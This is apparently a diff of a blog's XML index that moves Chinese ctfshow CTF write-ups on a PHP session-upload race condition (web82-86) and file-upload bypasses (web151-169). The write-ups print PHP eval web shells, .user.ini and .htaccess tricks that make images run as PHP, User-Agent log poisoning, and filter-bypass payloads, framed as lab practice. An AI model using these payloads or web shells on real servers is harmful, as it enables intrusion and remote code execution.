class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>文件随便上传一个</p>
+<p>发送到i(爆破)</p>
+<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
+<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
+<p>?file=/tmp/sess_flag</p>
+<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
+<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
+<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
+<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
+<p>此处设置 null payload 以及 无限重复</p>
+<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
+<p>新建一个资源池，设置线程为30</p>
+<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
+<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
+<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
+<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
+<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
+<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
+<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
+<h1>web83</h1>
+<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
+<p>我这web82的保存下来了</p>
+<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
+<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
+<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
+<h1>web84</h1>
+<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
+<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
+<h1>web85</h1>
+<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
+<h1>web86</h1>
+<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
+]]></content>
+      <tags>
+        <tag>web竞争</tag>
       </tags>
   </entry>
   <entry>
@@ -2000,47 +2073,87 @@ preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变�
       </tags>
   </entry>
   <entry>
-    <title>web82-86竞争</title>
-    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
-    <content><![CDATA[<h1>web82</h1>
-<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
-首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>文件随便上传一个</p>
-<p>发送到i(爆破)</p>
-<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
-<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
-<p>?file=/tmp/sess_flag</p>
-<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
-<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
-<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
-<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
-<p>此处设置 null payload 以及 无限重复</p>
-<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
-<p>新建一个资源池，设置线程为30</p>
-<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
-<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
-<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
-<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
-<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
-<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
-<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
-<h1>web83</h1>
-<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
-<p>我这web82的保存下来了</p>
-<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
-<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
-<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
-<h1>web84</h1>
-<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
-<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
-<h1>web85</h1>
-<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
-<h1>web86</h1>
-<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
+    <title>文件上传</title>
+    <url>/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1>web151</h1>
+<p>绕过前端检测</p>
+<p><img src="image-20250128000124382.png" alt="image-20250128000124382"></p>
+<p>lay-data=“{url: ‘upload.php’, accept: ‘images’,exts:‘png’}”</p>
+<p>后面的png改为php即可上传php文件</p>
+<p>php文件内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传之后antsword连接</p>
+<p>ctfshow{1b64824a-9dce-448c-b3ab-1a228b2976a4}</p>
+<h1>web152</h1>
+<p>我们还是要穿php文件，先把前端改了，然后bp抓包</p>
+<p>把Content-Type后面的东西改成image/png</p>
+<p>然后antsword连接</p>
+<p>ctfshow{442b5262-0765-423f-8759-546621822503}</p>
+<h1>web153</h1>
+<p>使用.user.ini文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/zmr.png</span><br></pre></td></tr></table></figure>
+<p>然后上传zmr.png木马图片</p>
+<p>antsword连接<a href="https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/">https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/</a></p>
+<p>ctfshow{787f5258-2357-435f-a3cb-3d36ff826349}</p>
+<h1>web154</h1>
+<p>文件内容不合规,过滤了php关键词</p>
+<p>把php换成=</p>
+<p>ctfshow{6022d1f3-ecab-4424-9e61-c71c64c7bbaa}</p>
+<h1>web155</h1>
+<p>上题同理</p>
+<p>ctfshow{c6337925-a6f3-4066-a910-ceb1951d6830}</p>
+<h1>web156</h1>
+<p><strong>过滤字符<code>[]</code>，<code>[]</code>可以可以使用<code>&#123;&#125;</code>代替。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;zmr&#x27;</span>&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>ctfshow{e52c5580-89b6-4c3f-aef6-c46687c1b009}</p>
+<h1>web157</h1>
+<p>又过滤了{}和;</p>
+<p><strong><code>&lt;?=system(&quot;tac ../f\*&quot;);?&gt;</code></strong></p>
+<p>再传一遍.user.ini</p>
+<p>直接拿flag</p>
+<p>如果flag位置变了，直接修改sys内容</p>
+<p>ctfshow{3f54cbb0-099f-4e95-9840-052316add8ee}</p>
+<h1>web158</h1>
+<p>上方方法</p>
+<p>ctfshow{0525c3f0-1c13-4486-a14f-812740141737}</p>
+<h1>web159</h1>
+<p>先发一遍.user.ini</p>
+<p>再改<?=`tac ../f*`?></p>
+<p>ctfshow{e818ad09-0b23-445f-b73e-d6a6b8fdd4f0}</p>
+<h1>web160</h1>
+<p>这一题过滤了log关键词，我真服了，这tm过滤了log谁tm能过滤log啊？现实别人服务器会过滤这玩意？这纯tm只跟ctf有关好吗？</p>
+<p>包含日志</p>
+<p>1.png当中写</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>.user.ini当作写</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/<span class="number">1</span>.png</span><br></pre></td></tr></table></figure>
+<p>进入/upload/</p>
+<p>uset-agent:<?php @eval($_POST['zmr']);?></p>
+<p>post传参</p>
+<p>ctfshow{cfacbc38-ea29-4652-9085-7fcf66e12707}</p>
+<h1>web161</h1>
+<p>方法同上，只是在png文件前面加一个GIF89A</p>
+<p>ctfshow{ecc6f79c-d50b-4662-805a-9efb1c61be22}</p>
+<h1>web162-166</h1>
+<p>涉及本地ip，不解释，自己wp</p>
+<h1>web167</h1>
+<p>服务器是apache</p>
+<p>用.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php.png</span><br></pre></td></tr></table></figure>
+<p>将<code>.png</code>后缀的文件解析 <strong>成<code>php</code></strong></p>
+<p>然后传zmr.jpg</p>
+<?php
+	@eval($_POST['zmr']);
+?>
+<p>ctfshow{5fdfdfe5-9048-45cf-a9c9-715a32cdf4a2}</p>
+<h1>web168</h1>
+<?=`tac ../flagaa.php`?>
+<p>ctfshow{dae808c7-e828-4e5e-9821-2387a549c2e5}</p>
+<p>wp说要啥免杀</p>
+<h1>web169</h1>
 ]]></content>
       <tags>
-        <tag>web竞争</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -2155,90 +2268,6 @@ preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变�
 ]]></content>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1>web151</h1>
-<p>绕过前端检测</p>
-<p><img src="image-20250128000124382.png" alt="image-20250128000124382"></p>
-<p>lay-data=“{url: ‘upload.php’, accept: ‘images’,exts:‘png’}”</p>
-<p>后面的png改为php即可上传php文件</p>
-<p>php文件内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传之后antsword连接</p>
-<p>ctfshow{1b64824a-9dce-448c-b3ab-1a228b2976a4}</p>
-<h1>web152</h1>
-<p>我们还是要穿php文件，先把前端改了，然后bp抓包</p>
-<p>把Content-Type后面的东西改成image/png</p>
-<p>然后antsword连接</p>
-<p>ctfshow{442b5262-0765-423f-8759-546621822503}</p>
-<h1>web153</h1>
-<p>使用.user.ini文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/zmr.png</span><br></pre></td></tr></table></figure>
-<p>然后上传zmr.png木马图片</p>
-<p>antsword连接<a href="https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/">https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/</a></p>
-<p>ctfshow{787f5258-2357-435f-a3cb-3d36ff826349}</p>
-<h1>web154</h1>
-<p>文件内容不合规,过滤了php关键词</p>
-<p>把php换成=</p>
-<p>ctfshow{6022d1f3-ecab-4424-9e61-c71c64c7bbaa}</p>
-<h1>web155</h1>
-<p>上题同理</p>
-<p>ctfshow{c6337925-a6f3-4066-a910-ceb1951d6830}</p>
-<h1>web156</h1>
-<p><strong>过滤字符<code>[]</code>，<code>[]</code>可以可以使用<code>&#123;&#125;</code>代替。</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;zmr&#x27;</span>&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>ctfshow{e52c5580-89b6-4c3f-aef6-c46687c1b009}</p>
-<h1>web157</h1>
-<p>又过滤了{}和;</p>
-<p><strong><code>&lt;?=system(&quot;tac ../f\*&quot;);?&gt;</code></strong></p>
-<p>再传一遍.user.ini</p>
-<p>直接拿flag</p>
-<p>如果flag位置变了，直接修改sys内容</p>
-<p>ctfshow{3f54cbb0-099f-4e95-9840-052316add8ee}</p>
-<h1>web158</h1>
-<p>上方方法</p>
-<p>ctfshow{0525c3f0-1c13-4486-a14f-812740141737}</p>
-<h1>web159</h1>
-<p>先发一遍.user.ini</p>
-<p>再改<?=`tac ../f*`?></p>
-<p>ctfshow{e818ad09-0b23-445f-b73e-d6a6b8fdd4f0}</p>
-<h1>web160</h1>
-<p>这一题过滤了log关键词，我真服了，这tm过滤了log谁tm能过滤log啊？现实别人服务器会过滤这玩意？这纯tm只跟ctf有关好吗？</p>
-<p>包含日志</p>
-<p>1.png当中写</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>.user.ini当作写</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/<span class="number">1</span>.png</span><br></pre></td></tr></table></figure>
-<p>进入/upload/</p>
-<p>uset-agent:<?php @eval($_POST['zmr']);?></p>
-<p>post传参</p>
-<p>ctfshow{cfacbc38-ea29-4652-9085-7fcf66e12707}</p>
-<h1>web161</h1>
-<p>方法同上，只是在png文件前面加一个GIF89A</p>
-<p>ctfshow{ecc6f79c-d50b-4662-805a-9efb1c61be22}</p>
-<h1>web162-166</h1>
-<p>涉及本地ip，不解释，自己wp</p>
-<h1>web167</h1>
-<p>服务器是apache</p>
-<p>用.htaccess</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php.png</span><br></pre></td></tr></table></figure>
-<p>将<code>.png</code>后缀的文件解析 <strong>成<code>php</code></strong></p>
-<p>然后传zmr.jpg</p>
-<?php
-	@eval($_POST['zmr']);
-?>
-<p>ctfshow{5fdfdfe5-9048-45cf-a9c9-715a32cdf4a2}</p>
-<h1>web168</h1>
-<?=`tac ../flagaa.php`?>
-<p>ctfshow{dae808c7-e828-4e5e-9821-2387a549c2e5}</p>
-<p>wp说要啥免杀</p>
-<h1>web169</h1>
-]]></content>
-      <tags>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
